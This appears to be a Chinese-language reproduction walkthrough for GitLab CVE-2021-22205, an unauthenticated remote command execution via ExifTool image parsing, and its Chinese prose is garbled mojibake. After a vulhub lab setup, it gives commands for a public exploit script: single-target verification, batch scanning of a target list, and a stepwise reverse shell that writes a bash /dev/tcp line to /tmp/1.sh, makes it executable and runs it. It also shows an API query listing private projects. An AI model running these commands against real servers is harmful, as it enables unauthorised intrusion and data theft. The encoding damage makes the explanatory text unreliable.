# 0x00 æ¼æ´æ¦‚è¿°
åœ¨GitLab CE/EEä¸­å‘ç°äº†ä¸€ä¸ªé—®é¢˜ï¼Œå½±å“äº†ä»11.9å¼€å§‹çš„æ‰€æœ‰ç‰ˆæœ¬ã€‚GitLabæœªæ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æå™¨çš„å›¾åƒæ–‡ä»¶ï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚

GitLab æ˜¯ç”±GitLab Inc.å¼€å‘çš„ä¸€ä¸ªç”¨äºä»“åº“ç®¡ç†ç³»ç»Ÿçš„å¼€æºé¡¹ç›®ï¼Œä½¿ç”¨Gitä½œä¸ºä»£ç ç®¡ç†å·¥å…·ï¼Œå¯é€šè¿‡Webç•Œé¢è®¿é—®å…¬å¼€æˆ–ç§äººé¡¹ç›®ã€‚ç”±äºGitLabå­˜åœ¨æœªæˆæƒçš„ç«¯ç‚¹ï¼Œå¯¼è‡´è¯¥æ¼æ´åœ¨æ— éœ€è¿›è¡Œèº«ä»½éªŒè¯çš„æƒ…å†µä¸‹å³å¯è¿›è¡Œåˆ©ç”¨ã€‚
# 0x01 å½±å“ç‰ˆæœ¬
è¯¥æ¼æ´å½±å“ä»¥ä¸‹GitLabä¼ä¸šç‰ˆå’Œç¤¾åŒºç‰ˆï¼š
- 13.10 <= Gitlab CE/EE < 13.10.3
- 13.9 <= Gitlab CE/EE < 13.9.6
- 11.9 <= Gitlab CE/EE < 13.8.8

ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å¯æŸ¥çœ‹å½“å‰GitLabçš„ç‰ˆæœ¬ï¼š
```
cat /opt/gitlab/embedded/service/gitlab-rails/VERSION
```

# 0x02 æ¼æ´åˆ†æ
æœªæˆæƒçš„ç«¯ç‚¹åœ¨äºç”¨æˆ·ç™»å½•å¤„ï¼šhttps://xx.xx.xx.xx/users/sign_up

è¿˜å¯ä»¥æ»¥ç”¨Gitlab APIæ¥å£åˆ—å‡ºæ‰€æœ‰é¡¹ç›®ï¼ˆåŒ…æ‹¬ç§æœ‰é¡¹ç›®ï¼‰
https://xx.xx.xx.xx/api/v4/projects/?simple=yes&private=true&per_page=1000&page=1

æ­¤æ¼æ´æ˜¯é€šè¿‡ä¸Šä¼ åŠŸèƒ½æ¥å®ç°RCEçš„ï¼Œæ¼æ´å‡ºäºExifToolåŠŸèƒ½å¤„ï¼Œç”¨äºä»å›¾åƒä¸­ç§»é™¤å…ƒæ•°æ®çš„å¼€æºå·¥å…·ï¼Œå› ä¸ºæ­¤å·¥å…·åœ¨è§£æä¸Šä¼ å›¾åƒä¸­çš„å…ƒæ•°æ®æ—¶ï¼Œå¹¶æ²¡æœ‰å®Œå…¨è§£ææŸäº›å…ƒæ•°æ®ï¼Œå¯¼è‡´æ”»å‡»è€…ä¸Šä¼ å¸¦æœ‰æ¶æ„å…ƒæ•°æ®çš„å›¾ç‰‡ï¼Œä»è€Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚

# 0x03 ç¯å¢ƒæ­å»º
```
git clone https://github.com/vulhub/vulhub.git
cd vulhub/gitlab/CVE-2021-22205/
docker-compose up -d
```

ç¯å¢ƒå¯åŠ¨åï¼Œè®¿é—®http://your-ip:8080å³å¯æŸ¥çœ‹åˆ°GitLabçš„ç™»å½•é¡µé¢ã€‚

```
é¶æœºï¼š192.168.210.206
æ”»å‡»æœº windowsï¼š192.168.210.186
æ”»å‡»æœº kaliï¼š192.168.210.186
```

# 0x04 æ¼æ´å¤ç°
- ğŸ”— [CVE-2021-22205.py](https://github.com/Al1ex/CVE-2021-22205)

## 1ã€è®¿é—®GitLabç™»é™†ç•Œé¢

æœªæˆæƒçš„ç«¯å£åœ¨äºç”¨æˆ·ç™»å½•å¤„ï¼šhttps://xx.xx.xx.xx/users/sign_up

![image](https://user-images.githubusercontent.com/84888757/174459287-4880a9c3-99ae-4a21-afae-09b2399d6b2e.png)

## 2ã€æ¼æ´éªŒè¯
POCï¼šhttps://github.com/Al1ex/CVE-2021-22205

éªŒè¯ï¼š
```
python3 CVE-2021-22205.py -v true -t http://ç›®æ ‡IP:Port
```

![image](https://user-images.githubusercontent.com/84888757/174459288-9763f890-2c58-43c0-9266-5085083458b5.png)


## 3ã€æ‰¹é‡æ£€æµ‹
python3 CVE-2021-2205.py -s true -f target.txt


## 4ã€åå¼¹shell
1ï¼‰kaliå¼€å¯ç›‘å¬
```
nc -lvvp 6666
```

2ï¼‰åœ¨é¶æœºçš„/tmpä¸‹å†™å…¥ä¸€ä¸ª1.shæ–‡ä»¶ï¼Œç”¨äºåå¼¹shell
```
python3 CVE-2021-2205.py -a true -t http://gitlab.example.com -c "echo 'bash -i >& /dev/tcp/æ”»å‡»æ–¹ip/port 0>&1' > /tmp/1.sh"
```

![image](https://user-images.githubusercontent.com/84888757/174459383-bc832b38-a685-42ac-97d7-cfcbded95fb2.png)

åœ¨é¶æœºæŸ¥çœ‹/tmpç›®å½•ä¸‹å·²ç»å†™å…¥ä¸€ä¸ª1.shæ–‡ä»¶ï¼š

![image](https://user-images.githubusercontent.com/84888757/174459394-cd5a8676-4131-409b-a726-eae73c7240f3.png)



3ï¼‰ç»™å†™å…¥çš„1.shæ–‡ä»¶æ·»åŠ æ‰§è¡Œæƒé™
```
python3 CVE-2021-2205.py -a true -t http://gitlab.example.com -c "chmod +x /tmp/1.sh"
```

![image](https://user-images.githubusercontent.com/84888757/174459397-16f3a133-4d6a-44dd-b161-3974a7e9f0cf.png)

åœ¨é¶æœºæŸ¥çœ‹`1.sh`å·²ç»æ·»åŠ äº†æ‰§è¡Œæƒé™ï¼š

![image](https://user-images.githubusercontent.com/84888757/174459410-e01f9ac8-4fb5-4557-a565-21bebe381be9.png)


4ï¼‰æ‰§è¡Œ`1.sh`æ–‡ä»¶
```
python3 CVE-2021-2205.py -a true -t http://gitlab.example.com -c "/bin/bash /tmp/1.sh"
```

5ï¼‰kaliæ”¶åˆ°åå¼¹çš„shell

![image](https://user-images.githubusercontent.com/84888757/174459421-e4edf211-5a7c-40ba-8e8c-528aeabadc88.png)

